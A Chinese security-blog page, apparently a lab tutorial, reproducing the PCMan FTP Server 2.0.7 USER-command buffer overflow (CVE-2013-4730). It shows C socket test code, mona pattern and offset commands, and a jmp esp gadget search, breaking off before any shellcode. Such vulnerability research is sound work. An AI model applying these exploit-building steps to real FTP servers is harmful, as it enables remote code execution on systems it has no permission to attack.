@@ -1,0 +1,669 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=10,IE=9,IE=8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
+<title>PCMan&#8217;s FTP 漏洞（CVE-2013-4730）详细复现调试过程与exp构造 &#8211; 即刻安全</title>
+<script>
+window._deel = {
+    name: '即刻安全',
+    url: 'http://www.secist.com/wp-content/themes/D8_4.0',
+    rss: '',
+    ajaxpager: '',
+    maillist: '',
+    maillistCode: '',
+    commenton: 1,
+    roll: [0,0],
+    tougaoContentmin: 200,
+    tougaoContentmax: 5000,
+    appkey: {
+    	tqq: '801494063',
+    	tsina: '576924089',
+    	t163: '',
+    	tsohu: ''
+    }
+}
+</script>
+
+<link rel="stylesheet" href="css/owl.carousel.css" type="text/css" />
+<script type="text/javascript" src="js/jquery-1.8.3.min.js"></script>
+<script type="text/javascript" src="js/owl.carousel.js"></script>
+<script type="text/javascript">
+$(function(){
+	
+};
+</script>
+<style type="text/css">
+*{margin:0;padding:0;list-style-type:none;}
+#owl-demo img{border:0 none;}
+#owl-demo{position:relative;width:1200px;height:235px;padding-bottom:100px;margin:0px auto 0 auto;}
+#owl-demo ul{margin:-10px -10px 0 0;overflow:hidden;zoom:1;}
+#owl-demo li{position:relative;float:left;margin:10px 10px 0 0;overflow:hidden;_display:inline;}
+#owl-demo .li1{width:660px;height:330px;}
+#owl-demo .li2{width:530px;height:190px;}
+#owl-demo .li3{width:260px;height:130px;}
+#owl-demo .txt{position:absolute;left:0;bottom:-86px;_bottom:-1px;width:100%;padding:6px 0;font-size:12px;color:#fff;background:url(images/overlay.png);background:rgba(0, 0, 0, .7);transition:bottom 0.3s ease-out 0s;}
+#owl-demo h3{padding:0 15px;font-family:"Microsoft Yahei";font-size:18px;font-weight:500;}
+#owl-demo .li1 .txt{bottom:0;}
+#owl-demo .li1 h3{padding:0 25px;font-size:28px;}
+#owl-demo p{margin-top:4px;padding:0 25px 5px;}
+#owl-demo a{color:#fff;text-decoration:none;}
+#owl-demo li:hover .txt{bottom:0;}
+</style>
+
+
+
+<link rel='dns-prefetch' href='//s.w.org' />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.secist.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56692,8205,9792,65039],[55357,56692,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='style-css'  href='http://www.secist.com/wp-content/themes/D8_4.0/style.css?ver=3.0' type='text/css' media='all' />
+<link rel='stylesheet' id='enlighter-local-css'  href='http://www.secist.com/wp-content/plugins/enlighter/resources/EnlighterJS.min.css?ver=3.7' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.secist.com/wp-content/themes/D8_4.0/js/jquery.js?ver=3.0'></script>
+<link rel='https://api.w.org/' href='http://www.secist.com/wp-json/' />
+<link rel='prev' title='在多GPU系统上使用hashcat进行密码破解' href='http://www.secist.com/archives/7465.html' />
+<link rel='next' title='如何绕过高版本 JDK 的限制进行 JNDI 注入利用' href='http://www.secist.com/archives/7489.html' />
+<link rel="canonical" href="http://www.secist.com/archives/7475.html" />
+<link rel='shortlink' href='http://www.secist.com/?p=7475' />
+<link rel="alternate" type="application/json+oembed" href="http://www.secist.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.secist.com%2Farchives%2F7475.html" />
+<link rel="alternate" type="text/xml+oembed" href="http://www.secist.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.secist.com%2Farchives%2F7475.html&#038;format=xml" />
+
+<link rel="stylesheet" href="http://www.secist.com/wp-content/plugins/auto-highslide/highslide/highslide.css" type="text/css" />
+<script type="text/javascript" src="http://www.secist.com/wp-content/plugins/auto-highslide/highslide/highslide-with-html.packed.js"></script>
+<script type="text/javascript">
+jQuery(document).ready(function($) {
+    hs.graphicsDir = "http://www.secist.com/wp-content/plugins/auto-highslide/highslide/graphics/";
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.addSlideshow({
+        interval: 5000,
+        repeat: true,
+        useControls: true,
+        fixedControls: "fit",
+        overlayOptions: {
+            opacity: 0.75,
+            position: "bottom center",
+            hideOnMouseOut: true
+
+        }
+
+    });
+});
+</script>
+	<style data-context="foundation-flickity-css">/*! Flickity v2.0.2
+http://flickity.metafizzy.co
+---------------------------------------------- */.flickity-enabled{position:relative}.flickity-enabled:focus{outline:0}.flickity-viewport{overflow:hidden;position:relative;height:100%}.flickity-slider{position:absolute;width:100%;height:100%}.flickity-enabled.is-draggable{-webkit-tap-highlight-color:transparent;tap-highlight-color:transparent;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.flickity-enabled.is-draggable .flickity-viewport{cursor:move;cursor:-webkit-grab;cursor:grab}.flickity-enabled.is-draggable .flickity-viewport.is-pointer-down{cursor:-webkit-grabbing;cursor:grabbing}.flickity-prev-next-button{position:absolute;top:50%;width:44px;height:44px;border:none;border-radius:50%;background:#fff;background:hsla(0,0%,100%,.75);cursor:pointer;-webkit-transform:translateY(-50%);transform:translateY(-50%)}.flickity-prev-next-button:hover{background:#fff}.flickity-prev-next-button:focus{outline:0;box-shadow:0 0 0 5px #09F}.flickity-prev-next-button:active{opacity:.6}.flickity-prev-next-button.previous{left:10px}.flickity-prev-next-button.next{right:10px}.flickity-rtl .flickity-prev-next-button.previous{left:auto;right:10px}.flickity-rtl .flickity-prev-next-button.next{right:auto;left:10px}.flickity-prev-next-button:disabled{opacity:.3;cursor:auto}.flickity-prev-next-button svg{position:absolute;left:20%;top:20%;width:60%;height:60%}.flickity-prev-next-button .arrow{fill:#333}.flickity-page-dots{position:absolute;width:100%;bottom:-25px;padding:0;margin:0;list-style:none;text-align:center;line-height:1}.flickity-rtl .flickity-page-dots{direction:rtl}.flickity-page-dots .dot{display:inline-block;width:10px;height:10px;margin:0 8px;background:#333;border-radius:50%;opacity:.25;cursor:pointer}.flickity-page-dots .dot.is-selected{opacity:1}</style><style data-context="foundation-slideout-css">.slideout-menu{position:fixed;left:0;top:0;bottom:0;right:auto;z-index:0;width:256px;overflow-y:auto;-webkit-overflow-scrolling:touch;display:none}.slideout-menu.pushit-right{left:auto;right:0}.slideout-panel{position:relative;z-index:1;will-change:transform}.slideout-open,.slideout-open .slideout-panel,.slideout-open body{overflow:hidden}.slideout-open .slideout-menu{display:block}.pushit{display:none}</style><meta name="keywords" content="CVE, exp, Windows, 缓冲区溢出, 渗透测试">
+<meta name="description" content="&nbsp;    1. 漏洞简介 软件名称 PCMAN ftp 软件版本 server 2.0.7 漏洞类型 远程缓冲区溢出 漏洞触发点 未对user命令做长度限制检查 漏洞编号 CVE-2013-4730  其他信息：  http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4730_A 2. 漏洞详细复现 1. 环境搭建 1. 准备工作：    	自动生成有序数，并能确定异常">
+<link rel="icon" href="http://www.secist.com/wp-content/uploads/2016/07/cropped-Fk9Vdo1dxGkldvMayznJo8ZVC5RM-1-32x32.png" sizes="32x32" />
+<link rel="icon" href="http://www.secist.com/wp-content/uploads/2016/07/cropped-Fk9Vdo1dxGkldvMayznJo8ZVC5RM-1-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="http://www.secist.com/wp-content/uploads/2016/07/cropped-Fk9Vdo1dxGkldvMayznJo8ZVC5RM-1-180x180.png" />
+<meta name="msapplication-TileImage" content="http://www.secist.com/wp-content/uploads/2016/07/cropped-Fk9Vdo1dxGkldvMayznJo8ZVC5RM-1-270x270.png" />
+<style>.ios7.web-app-mode.has-fixed header{ background-color: rgba(3,122,221,.88);}</style><style>.article-content{font-size: 16px;line-height:27px;}.article-content p{margin:20px 0;}@media (max-width:640px){.article-content{font-size:16px}}body{margin-top: 52px}.navbar-wrap{position:fixed}@media (max-width: 979px){body{margin-top: 0}.navbar-wrap{position:relative}}</style><!--[if lt IE 9]><script src="http://www.secist.com/wp-content/themes/D8_4.0/js/html5.js"></script><![endif]-->
+</head>
+<body class="post-template-default single single-post postid-7475 single-format-standard">
+<div class="navbar-wrap">
+<div class="navbar">
+		<div class="logo"><a href="http://www.secist.com" title="即刻安全-|致力于网络安全的研究学习平台">即刻安全</a></div>
+		<ul class="nav">
+			<li id="menu-item-14" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-14"><a href="http://www.secist.com/">首页</a></li>
+<li id="menu-item-34" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34"><a href="http://www.secist.com/archives/category/%e5%ae%89%e5%85%a8%e5%8a%a8%e6%80%81">安全动态</a></li>
+<li id="menu-item-3075" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3075"><a>公开课</a>
+<ul class="sub-menu">
+	<li id="menu-item-3076" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3076"><a href="http://www.secist.com/videos/index.html">Metasploit</a></li>
+</ul>
+</li>
+<li id="menu-item-11" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-has-children menu-item-11"><a href="http://www.secist.com/archives/category/%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95">渗透测试</a>
+<ul class="sub-menu">
+	<li id="menu-item-8" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-8"><a href="http://www.secist.com/archives/category/kali-linux">Kali Linux</a></li>
+	<li id="menu-item-2931" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2931"><a href="http://www.secist.com/archives/category/web%e5%ae%89%e5%85%a8">WEB安全</a></li>
+	<li id="menu-item-31" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-31"><a href="http://www.secist.com/archives/category/windows">Windows</a></li>
+	<li id="menu-item-9" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9"><a href="http://www.secist.com/archives/category/%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1">代码审计</a></li>
+</ul>
+</li>
+<li id="menu-item-101" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-101"><a href="http://www.secist.com/archives/category/%e5%8e%9f%e5%88%9b%e7%bf%bb%e8%af%91">原创翻译</a></li>
+<li id="menu-item-2761" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-2761"><a>黑客</a>
+<ul class="sub-menu">
+	<li id="menu-item-3250" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3250"><a href="http://www.secist.com/archives/category/%e9%80%86%e5%90%91%e5%b7%a5%e7%a8%8b">逆向工程</a></li>
+	<li id="menu-item-3632" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3632"><a href="http://www.secist.com/archives/category/ctf">CTF</a></li>
+	<li id="menu-item-2662" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2662"><a href="http://www.secist.com/archives/category/%e7%a4%be%e4%bc%9a%e5%b7%a5%e7%a8%8b%e5%ad%a6">社会工程学</a></li>
+	<li id="menu-item-13" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13"><a href="http://www.secist.com/archives/category/%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7">安全工具</a></li>
+	<li id="menu-item-10" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-10"><a href="http://www.secist.com/archives/category/%e6%97%a0%e7%ba%bf%e5%ae%89%e5%85%a8">无线安全</a></li>
+</ul>
+</li>
+<li id="menu-item-3239" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3239"><a>GitHub</a>
+<ul class="sub-menu">
+	<li id="menu-item-3240" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3240"><a target="_blank" href="http://www.secist.com/GitHub/secist_script.html">secist_script v2.0</a></li>
+	<li id="menu-item-4275" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4275"><a target="_blank" href="http://www.secist.com/GitHub2/secist_script.html">secist_GUI v2.0</a></li>
+</ul>
+</li>
+<li id="menu-item-3938" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-3938"><a href="http://www.secist.com/archives/category/%e5%ae%89%e8%bf%b0">安述</a>
+<ul class="sub-menu">
+	<li id="menu-item-3908" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3908"><a href="http://www.secist.com/%e7%ae%80%e4%bb%8b">简介</a></li>
+</ul>
+</li>
+<li id="menu-item-2763" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-2763"><a>关于</a>
+<ul class="sub-menu">
+	<li id="menu-item-3906" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3906"><a href="http://www.secist.com/%e7%94%b3%e8%af%b7%e5%8a%a0%e5%85%a5">申请加入</a></li>
+	<li id="menu-item-2824" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-2824"><a>成员博客</a>
+	<ul class="sub-menu">
+		<li id="menu-item-2623" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2623"><a target="_blank" href="http://www.ggsec.cn/">Demon</a></li>
+	</ul>
+</li>
+	<li id="menu-item-36" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-36"><a href="http://www.secist.com/gropinfo/grop.html">成员墙</a></li>
+	<li id="menu-item-3388" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3388"><a href="http://www.secist.com/%e6%88%90%e5%91%98%e4%b8%be%e6%8a%a5">成员举报</a></li>
+	<li id="menu-item-3372" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3372"><a target="_blank" href="http://www.baike.com/wiki/即刻安全">关于我们</a></li>
+	<li id="menu-item-1237" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1237"><a href="http://www.secist.com/%e5%85%b3%e4%ba%8e%e5%86%85%e5%ae%b9">关于内容</a></li>
+	<li id="menu-item-46" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-46"><a href="http://www.secist.com/%e5%8f%8b%e9%93%be%e7%94%b3%e8%af%b7">友链申请</a></li>
+	<li id="menu-item-23" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-23"><a href="http://www.secist.com/18-2">免责声明</a></li>
+</ul>
+</li>
+		</ul>
+		<div class="menu pull-right">
+			<form method="get" class="dropdown search-form" action="http://www.secist.com/" >
+				<input class="search-input" name="s" type="text" placeholder="输入关键字搜索" x-webkit-speech=""><input class="btn btn-success search-submit" type="submit" value="搜索">
+				<ul class="dropdown-menu search-suggest"></ul>
+			</form>
+			<div class="btn-group pull-left">
+				<button class="btn btn-primary" data-toggle="modal" data-target="#feed">订阅</button>
+							</div>
+		</div>
+</div>
+</div>
+<header class="header">
+	<div class="speedbar">
+					<div class="pull-right">
+				<i class="icon-user icon12"></i> <a href="http://www.secist.com/wp-login.php">登录</a>			</div>
+				<div class="toptip"><strong class="text-success">最新消息：</strong><font color="red"></font></div>
+
+	</div>
+
+<div id="owl-demo" class="owl-carousel">
+	<div class="itme">
+		<ul>
+			<li class="li1">
+				<a href="http://www.secist.com/archives/4016.html"><img src="http://www.secist.com/wp-content/uploads/2017/07/t01908b418fc453357d.png" alt=""></a>
+				<div class="txt">
+					<h3><a href="http://www.secist.com/archives/4016.html">我的不归路之重新认识Docker（完整版）</a></h3>
+				</div>
+			</li>
+			<li class="li2">
+				<a href="http://www.secist.com/archives/6944.html
+"><img src="http://www.secist.com/wp-content/uploads/2018/07/1519805116.11.jpg" alt=""></a>
+				<div class="txt">
+					<h3><a href="http://www.secist.com/archives/6944.html
+">即刻&指尖安全：助力白帽子，我们在行动！</a></h3>
+				</div>
+			</li>
+			<li class="li3">
+				<a href="http://www.secist.com/archives/2566.html"><img src="http://www.secist.com/wp-content/uploads/2017/02/wKiom1fGdBKQe3QjAAFIL6I8BFc882.jpg-wh_651x-s_2568083327.jpg" alt=""></a>
+				<div class="txt">
+					<h3><a href="http://www.secist.com/archives/2566.html">对学校的二次渗透之从提权到账号克隆</a></h3>
+				</div>
+			</li>
+			<li class="li3">
+				<a href="http://www.secist.com/archives/2587.html"><img src="http://www.secist.com/wp-content/uploads/2017/02/wKiom1fGdBKQe3QjAAFIL6I8BFc882.jpg-wh_651x-s_2568083327.jpg" alt=""></a>
+				<div class="txt">
+					<h3><a href="http://www.secist.com/archives/2587.html">三次渗透之利用Rspider拿下全部学生机</a></h3>
+				</div>
+			</li>
+		</ul>
+	</div>
+</header>
+
+<section class="container">
+
+	
+
+
+	
+
+	<div class="content-wrap">
+	<div class="content">
+		<div class="breadcrumbs">你的位置：<a href="http://www.secist.com">即刻安全</a> <small>></small> <a href="http://www.secist.com/archives/category/%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95">渗透测试</a> <small>></small> <span class="muted">PCMan&#8217;s FTP 漏洞（CVE-2013-4730）详细复现调试过程与exp构造</span></div>
+				<header class="article-header">
+			<h1 class="article-title"><a href="http://www.secist.com/archives/7475.html">PCMan&#8217;s FTP 漏洞（CVE-2013-4730）详细复现调试过程与exp构造</a></h1>
+			<div class="meta">
+				<span class="muted"><a href="http://www.secist.com/archives/category/%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95"><i class="icon-list-alt icon12"></i> 渗透测试</a></span>				<span class="muted"><i class="icon-user icon12"></i> <a href="http://www.secist.com/archives/author/gkniu">Eternal</a></span>
+				<time class="muted"><i class="ico icon-time icon12"></i> 1年前 (2019-05-19)</time>
+				<span class="muted"><i class="ico icon-eye-open icon12"></i> 23375浏览</span>
+				<span class="muted"><i class="icon-comment icon12"></i> <a href="http://www.secist.com/archives/7475.html#comments">0评论</a></span>							</div>
+		</header>
+
+				
+		<article class="article-content">
+			<p>&nbsp;</p>
+<div class="article-content">
+<p><a class="highslide-img" href="https://p3.ssl.qhimg.com/t012a8cec1c07e5941d.jpg" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p3.ssl.qhimg.com/t012a8cec1c07e5941d.jpg" alt="" width="720" height="432" data-original="https://p3.ssl.qhimg.com/t012a8cec1c07e5941d.jpg" /></a></p>
+<h2 id="h2-0">1. 漏洞简介</h2>
+<h3 id="h3-1">软件名称</h3>
+<p>PCMAN ftp</p>
+<h3 id="h3-2">软件版本</h3>
+<p>server 2.0.7</p>
+<h3 id="h3-3">漏洞类型</h3>
+<p>远程缓冲区溢出</p>
+<h3 id="h3-4">漏洞触发点</h3>
+<p>未对user命令做长度限制检查</p>
+<h3 id="h3-5">漏洞编号</h3>
+<p>CVE-2013-4730</p>
+<p>其他信息：</p>
+<p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4730_A">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4730_A</a></p>
+<h2 id="h2-6">2. 漏洞详细复现</h2>
+<h3 id="h3-7"><a class="reference-link" name="1.%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"></a>1. 环境搭建</h3>
+<p id="h3-1-"><a class="reference-link" name="1.%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%EF%BC%9A"></a><strong>1. 准备工作：</strong></p>
+<ol>
+<li>自动生成有序数，并能确定异常点的偏移可以使用windbg插件Mona2</li>
+<li>Mona2 需要Python2.7</li>
+<li>windbg（用来定位jmp esp地址）</li>
+<li>x64dbg</li>
+<li>vs写测试代码和shellcode</li>
+</ol>
+<p id="h3-2-"><strong><a class="reference-link" name="2.%20%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%9A"></a>2. 环境配置：</strong></p>
+<ol>
+<li>虚拟机win7 sp1</li>
+<li>wdk 自带windbg</li>
+<li>python2.7</li>
+<li>vc++ 2008运行库</li>
+<li>安装windbg的python 插件pykd</li>
+<li>复制mona.py和windbglib.py到windbg同目录</li>
+<li>运行windbg随便调试一个程序进程环境测试</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>.load pykd.pyd</td>
+<td>加载pykd</td>
+</tr>
+<tr>
+<td>!py mona</td>
+<td>测试mona</td>
+</tr>
+<tr>
+<td>.reload /f</td>
+<td>检查windbg符号路径是否正常</td>
+</tr>
+</tbody>
+</table>
+<p>mona安装成功截图<a class="highslide-img" href="https://p2.ssl.qhimg.com/t01cb844f2ba73c88e6.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p2.ssl.qhimg.com/t01cb844f2ba73c88e6.png" alt="" data-original="https://p2.ssl.qhimg.com/t01cb844f2ba73c88e6.png" /></a></p>
+<h3 id="h3-8"><a class="reference-link" name="2.%20vs2015%E5%86%99%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"></a>2. vs2015写测试代码</h3>
+<p>首先我们要能与FTP进行交互才能触发漏洞，只要我们编写的代码符合RFC959标准，就可以与任何一个FTP服务器进行交互，有兴趣的可以去阅读RFC959文档。</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include &lt;stdio.h&gt;
+#include &lt;WinSock2.h&gt;
+#include &lt;windows.h&gt;
+#pragma comment(lib,"ws2_32.lib")
+
+int main()
+{
+    // 1. -初始化WinSocket服务
+    WSADATA stWSA;
+    WSAStartup(0x0202, &amp;stWSA);
+    // 2. 创建一个原始套接字
+    SOCKET stListen = INVALID_SOCKET;
+    stListen = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+    // 3. 在任意地址绑定端口21
+    SOCKADDR_IN stService;
+    stService.sin_addr.s_addr = inet_addr("192.168.43.82");
+    stService.sin_port = htons(21);
+    stService.sin_family = AF_INET;
+    connect(stListen, (SOCKADDR*)&amp;stService, sizeof(stService));
+    // 4. 接收返回信息缓冲区
+    char szRecv[0x100] = { 0 };
+    // 5. 登陆请求
+    char *pCompand = "USER SUN";
+
+
+    recv(stListen, szRecv, sizeof(szRecv), 0);
+    send(stListen, pCompand, strlen(pCompand), 0);
+    // 6. 接收信息
+    recv(stListen, szRecv, sizeof(szRecv), 0);
+    // 7. 清理环境
+    closesocket(stListen);
+    WSACleanup();
+    return 0;
+}</pre>
+<p>图中可以看到测试代码连接成功</p>
+<p><a class="highslide-img" href="https://p1.ssl.qhimg.com/t01a431dedc437a1b91.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p1.ssl.qhimg.com/t01a431dedc437a1b91.png" alt="" data-original="https://p1.ssl.qhimg.com/t01a431dedc437a1b91.png" /></a></p>
+<h3 id="h3-9"><a class="reference-link" name="3.%20poc%E6%9E%84%E9%80%A0"></a>3. poc构造</h3>
+<p>利用mona构造长字符串</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">!py mona pc 3000</pre>
+<p><a class="highslide-img" href="https://p1.ssl.qhimg.com/t018988d8f51d3784b6.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p1.ssl.qhimg.com/t018988d8f51d3784b6.png" alt="" data-original="https://p1.ssl.qhimg.com/t018988d8f51d3784b6.png" /></a></p>
+<p>在上述的测试代码中将用户名 USER SUN 改为刚生成的这个长字符串。看程序能不能崩溃,如果崩溃了，说明测试成功<a class="highslide-img" href="https://p4.ssl.qhimg.com/t016c97fb78968123db.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="" data-original="https://p4.ssl.qhimg.com/t016c97fb78968123db.png" /></a></p>
+<h3 id="h3-10"><a class="reference-link" name="4.%20%E5%A4%8D%E7%8E%B0"></a>4. 复现</h3>
+<ol>
+<li>打开pcman-ftp软件</li>
+<li>打开windbg并附加pcman-ftp进程</li>
+<li>windbg加载pykd.pyd
+<pre class="EnlighterJSRAW" data-enlighter-language="null">.load pykd.pyd</pre>
+</li>
+<li>vs发送测试包,然后看到windbg信息</li>
+</ol>
+<p>查看栈区发现已经被我们的数据覆盖了<a class="highslide-img" href="https://p0.ssl.qhimg.com/t01e3caea66770e05bc.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="" data-original="https://p0.ssl.qhimg.com/t01e3caea66770e05bc.png" /></a></p>
+<ol>
+<li>mona查看溢出点<br />
+!py mona po 发生溢出的eip</li>
+</ol>
+<p><a class="highslide-img" href="https://p3.ssl.qhimg.com/t010e5e53d7cf2f68ed.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p3.ssl.qhimg.com/t010e5e53d7cf2f68ed.png" alt="" data-original="https://p3.ssl.qhimg.com/t010e5e53d7cf2f68ed.png" /></a></p>
+<p>我们看到这里的偏移为2007</p>
+<h3 id="h3-11"><a class="reference-link" name="5.%20exploit%E6%9E%84%E9%80%A0"></a>5. exploit构造</h3>
+<p id="h3-1-jmp-esp"><a class="reference-link" name="1.%20%E6%89%BEjmp%20esp"></a><strong>1. 找jmp esp</strong></p>
+<p>首先找本模块的jmp esp看有没有能用的</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">!py mona.py jmp -r esp</pre>
+<p><a class="highslide-img" href="https://p3.ssl.qhimg.com/t01136077519030f0da.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p3.ssl.qhimg.com/t01136077519030f0da.png" alt="" data-original="https://p3.ssl.qhimg.com/t01136077519030f0da.png" /></a><br />
+然后找系统模块的jmp esp，一般都会用系统模块 因为某系特点的系统模块没有开随机基址</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">!py mona jmp -r esp -m kernel32.dll</pre>
+<p>找到了四个，并且可以用</p>
+<p><a class="highslide-img" href="https://p3.ssl.qhimg.com/t01d2536f7a616f6745.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p3.ssl.qhimg.com/t01d2536f7a616f6745.png" alt="" data-original="https://p3.ssl.qhimg.com/t01d2536f7a616f6745.png" /></a><br />
